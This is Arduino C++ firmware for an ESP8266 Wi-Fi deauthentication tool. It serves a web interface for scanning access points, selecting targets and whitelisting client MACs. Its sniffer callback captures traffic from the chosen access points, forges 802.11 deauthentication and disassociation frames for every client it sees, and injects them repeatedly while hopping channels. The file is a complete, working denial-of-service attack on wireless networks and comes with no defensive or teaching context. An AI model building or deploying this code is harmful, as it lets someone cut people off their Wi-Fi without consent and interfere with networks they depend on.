#include <Arduino.h>

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

#define maxAPScanResults 80
#define maxWhite 80
#define maxPackets 80

extern "C" {
#include "user_interface.h"
}

ESP8266WebServer server(80);

void startWifi(){
  WiFi.mode(WIFI_STA);
  WiFi.softAP("uchiha","deauther",1,true);
}

/*********************** AP *****************************/
int apsRes=0;

typedef struct{
  int channel;
  int rssi;
  String names;
  int encryption;
  bool hidden;
  String mac;
  bool selected;
}Ap;
Ap aps[maxAPScanResults];
int selAPch[maxAPScanResults];
String selAPmac[maxAPScanResults];


String getAPScan(){
  String json="{\"aps\":[";
  for(int i=0;i<apsRes;i++){

      if(i!=0){
        json+=",";
      }
      json+="{\"i\":"+(String)i;
      json+=",\"c\":"+(String)aps[i].channel;
      json+=",\"h\":"+(String)aps[i].hidden;
      json+=",\"m\":\""+aps[i].mac;
      json+="\",\"ss\":\""+aps[i].names;
      json+="\",\"r\":"+(String)aps[i].rssi;
      json+=",\"e\":"+(String)aps[i].encryption;
      json+=",\"se\":"+(String)aps[i].selected;
      json+="}";
  }
  json+="]}";

  //Serial.println(json);
  return json;
}

void apscan(){
  for(int i=0;i<maxAPScanResults;i++){
    aps[i].hidden = aps[i].selected = false;
    aps[i].channel = aps[i].rssi = aps[i].encryption = 0;
    aps[i].names = aps[i].mac = "";
  }
  WiFi.scanDelete();
  apsRes = WiFi.scanNetworks(false, true);
  if(apsRes>maxAPScanResults)
    apsRes=maxAPScanResults;
  for(int i=0;i<apsRes;i++){
      
      aps[i].channel = WiFi.channel(i);
      aps[i].rssi = WiFi.RSSI(i);
      aps[i].encryption = WiFi.encryptionType(i);
      aps[i].hidden = WiFi.isHidden(i);
      aps[i].names = WiFi.SSID(i);
      aps[i].mac = WiFi.BSSIDstr(i);
  }
  server.send(200,"text/json",getAPScan());
}

int selAPind=0;
void apsel(){
  if(server.hasArg("num")){
    int i=server.arg("num").toInt();
    if(!aps[i].selected)
      aps[i].selected=true;
    else
      aps[i].selected=false;
    for(i=0,selAPind=0;i<apsRes;i++){
      if(aps[i].selected){
        selAPch[selAPind]=aps[i].channel;
        selAPmac[selAPind]=aps[i].mac;
        selAPind++;
      }
    }
    //Serial.printf("Selected APs : %d\n",selAPind);
  }
  server.send(200,"text/json",getAPScan());
}


/*********************** CLIENT WHITELIST*****************************/
int wcmacno=0;
String wcmac[maxWhite];
void adw(){
  if(server.hasArg("mac")){
    if(wcmacno>maxWhite){
      server.send(200,"text/html","2");
    }else{
      for(int i=0;i<wcmacno;i++){
        if(wcmac[i]==server.arg("mac")){
          server.send(200,"text/html","1");
          return;
        }
      }
      wcmac[wcmacno++]=server.arg("mac");
      server.send(200,"text/html","0");
    }
  }
}

String getWC(){
  String json="{\"wcmac\":[";
  for(int i=0;i<wcmacno;i++){

      if(i!=0){
        json+=",";
      }
      json+="\""+wcmac[i]+"\"";
  }
  json+="]}";

  //Serial.println(json);
  return json;
}

void dlw(){
  if(server.hasArg("num")){
    int no=server.arg("num").toInt();
    if(no!=wcmacno-1)
      for(int i=no;i<wcmacno-1;i++)
        wcmac[i]=wcmac[i+1];
    wcmac[wcmacno-1]="";
    wcmacno--;
  }
  server.send(200,"text/json",getWC());
}

void wcli(){
  server.send(200,"text/json",getWC());
}

/************************ SNIFF & ATTACK***************************/
bool sniffing=false;
int curAPind=0;
int curAPch;

void sniff(){
  server.send(200,"text/html","0");
  curAPch=selAPch[curAPind];

//Serial.print("setting ch to ");
//Serial.printf("%d\n",curAPch);

  wifi_promiscuous_enable(0);
  WiFi.disconnect();
  sniffing=true;
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(curAPch);
  wifi_promiscuous_enable(1);
}

String mac2str(byte ar[]){
  String s;
  for(byte i=0;i<6;i++){
    char buf[3];
    sprintf(buf,"%02X",ar[i]);
    s+=buf;
    if(i<5)
      s+=':';
  }
  return s;
}

uint8_t packet[maxPackets][2][26];
int packetind=0;


bool isPresent(uint8_t *buf,int ind){
    if(buf[16+0]==packet[ind][0][10+0]&&buf[22+0]==packet[ind][0][4+0] && buf[16+1]==packet[ind][0][10+1]&&buf[22+1]==packet[ind][0][4+1] && buf[16+2]==packet[ind][0][10+2]&&buf[22+2]==packet[ind][0][4+2] && buf[16+3]==packet[ind][0][10+3]&&buf[22+3]==packet[ind][0][4+3] && buf[16+4]==packet[ind][0][10+4]&&buf[22+4]==packet[ind][0][4+4] && buf[16+5]==packet[ind][0][10+5]&&buf[22+5]==packet[ind][0][4+5])
      return true;
  return false;
}

int cappkts=0;
void sniffer(uint8_t *buf, uint16_t len) {
  
  if(len>27){
    String from=mac2str(buf+16);
    String to=mac2str(buf+22);
    bool wcprsnt=false;
    for(int i=0;i<wcmacno;i++){
      if(strcmp(wcmac[i].c_str(),to.c_str())==0){
        //Serial.println("whitelited client mac : "+to);
        wcprsnt=true;break;
      }
    }
    
    
    if(!wcprsnt){
      for(int i=0;i<selAPind;i++){
        if(strcmp(from.c_str(),selAPmac[i].c_str())==0){
          bool add=true;
          for(int i=0;i<packetind;i++){
            if(isPresent(buf,i)){//check packet present or not
              add=false;
            }
          }
          if(add){
          for(int i=0;i<2;i++){
            if(i==0)
              packet[packetind][i][0]=0xc0;//deauthentication //2nd byte of frame control
            else
              packet[packetind][i][0]=0xa0;//disaccosiation //2nd byte of frame control
            packet[packetind][i][1]=0;//1st byte of frame control
            packet[packetind][i][2]=0;//2nd byte of duration
            packet[packetind][i][3]=0;//1st byte of duration
            for(int j=0;j<6;j++)
              packet[packetind][i][4+j]=buf[22+j];//client
            for(int j=0;j<6;j++)
              packet[packetind][i][10+j]=packet[packetind][i][16+j]=buf[16+j];//ap
             packet[packetind][i][22]=0;
             packet[packetind][i][23]=0;
             packet[packetind][i][24]=1;//reason
             packet[packetind][i][25]=0;
           }
           packetind++;
          }
          for(int i=0;i<packetind;i++)
            for(int j=0;j<2;j++)
              wifi_send_pkt_freedom(&packet[i][j][0], 26, true);//to perform packet injection
        }
      }
    }
    
  }


  if(selAPind>1){
    cappkts++;
    if(cappkts>=200){
      cappkts=0;
      curAPind++;
      if(curAPind>=selAPind)
        curAPind=0;
      curAPch=selAPch[curAPind];
      wifi_set_channel(curAPch);
      //Serial.print("changed ch to ");
      //Serial.printf("%d\n",curAPch);
    }
  }
}

/******************************* HTML **********************************/
char htmlbuf[7000];
const static uint8_t indexhtml[] PROGMEM = {0x3c,0x68,0x74,0x6d,0x6c,0x3e,0x20,0x3c,0x68,0x65,0x61,0x64,0x3e,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0x3e,0x20};

char* html(){
  int _size = sizeof(indexhtml);
  for(int i=0;i<sizeof(htmlbuf);i++){
    if(i<_size)
      htmlbuf[i] = pgm_read_byte_near(indexhtml + i);
    else 
      htmlbuf[i] = 0x00;
  }
  return htmlbuf;
}

void root(){
  server.send(200,"text/html",html());
}

void setup() {
  Serial.begin(115200);
  delay(2000);
  wifi_set_promiscuous_rx_cb(sniffer); //Set up promiscuous callback 
  startWifi();
  
  server.onNotFound([](){server.send(404,"text/html","Not Found");});
  server.on("/",root);
  
  server.on("/apscan",apscan);
  server.on("/apsel",apsel);
  
  server.on("/adw",adw);
  server.on("/dlw",dlw);
  server.on("/wcli",wcli);
  
  server.on("/attack",sniff);

  
  server.begin();
}

void loop() {
  if(!sniffing)
    server.handleClient();
}
